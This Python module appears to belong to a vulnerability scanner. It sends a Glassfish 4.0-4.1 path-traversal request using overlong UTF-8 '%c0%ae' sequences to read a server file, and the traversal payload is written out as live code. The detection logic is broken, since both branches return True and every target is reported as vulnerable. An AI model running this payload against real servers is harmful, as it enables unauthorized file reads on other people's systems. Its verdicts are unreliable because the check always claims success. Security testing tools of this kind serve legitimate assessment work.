#!/usr/bin/env python3

from app.lib.utils.request import request
from app.lib.utils.common import get_useragent

class Glassfish_File_Read_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Glassfish文件任意读取漏洞',
            'description': 'Glassfish文件任意读取漏洞,影响范围为: Glassfish 4.0-4.1',
            'date': '2015-10-03',
            'exptype': 'check',
            'type': 'File Read'
        }
        self.url = url
        self.headers = {
                "User-Agent": get_useragent()
        }

    def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        url = self.url + '/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF'
        try:
            req = request.get(url, headers = self.headers)
            if 'Version' in req.text:
                result = "exits the Glassfish arbitrary file read vuln"
                return True
            else:
                return True
        except Exception as e:
            return False
        finally:
            pass

if __name__ == '__main__':
    Glassfish_File_Read = Glassfish_File_Read_BaseVerify('https://192.168.30.242:4848')
    Glassfish_File_Read.check()